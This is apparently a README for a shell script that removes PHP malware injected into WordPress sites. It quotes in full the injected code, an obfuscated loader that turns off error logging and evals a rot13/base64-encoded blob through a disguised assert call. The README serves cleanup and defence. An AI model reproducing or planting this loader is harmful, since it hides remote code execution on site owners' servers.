# searchAndDestroy
This is a little project of mine to help clean up some lovely injected PHP that I found on one of my web servers. Seems the malware was injected in to my server through an exploit in an highly popular but very old wordpress theme hosted by one of my virtual hosts. The malware spread to other wordpress installs. Fricksauce. 

This script is Licensed using the <a href="https://en.wikipedia.org/wiki/MIT_License">MIT license</a>. Use at your own risk. Backups are always your responsibility. This script worked on my Ubuntu Linux environment well, that's what I made it for.

<h2>Usage</h2>
To run it, first use the <i>copyTestData.sh</i> script to clone the local sample of infected files.
Then run the script such as <pre>./searchAndDestory.sh testData</pre>

Example output when it's run is:
<pre>
Beginning search in /var/www/arminass.gov/www/
282 affected files are reported in "./searchAndDestroy.sh.affectedFiles"
Fixed 282/282 infected files, from hell
</pre>

<h2>Injected Code</h2>
The injected code was/is:
<pre>
//###=CACHE START=###
@error_reporting(E_ALL);
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors", 0);
@error_reporting(0);
$wa = ASSERT_WARNING;
@assert_options(ASSERT_ACTIVE, 1);
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAyVUfXWUIloPN9VPWbqUEjBv8ioT9uMUIjMTS0MKZhL29gY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0cYvVzMQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMcCGRznQ0vYz1xAFtvZwSxLGVkAwqzBJEvBTSwAwV4ZwLkMGp3AQyvLJH1ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwqKWfYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTA1pzjfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVkAwN0MwH5ZmxjZwp3ZGVlBGp1BJDjMQHkAGyzA2HkLvVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7PtxWPK0tsD=="));'); $strings($light);
//###=CACHE END=###
</pre>

This script fixes that, I had some key help from my corresponding stack exchange question regarding this:
http://unix.stackexchange.com/questions/322912/complex-multiline-search-replace-to-remove-injected-code
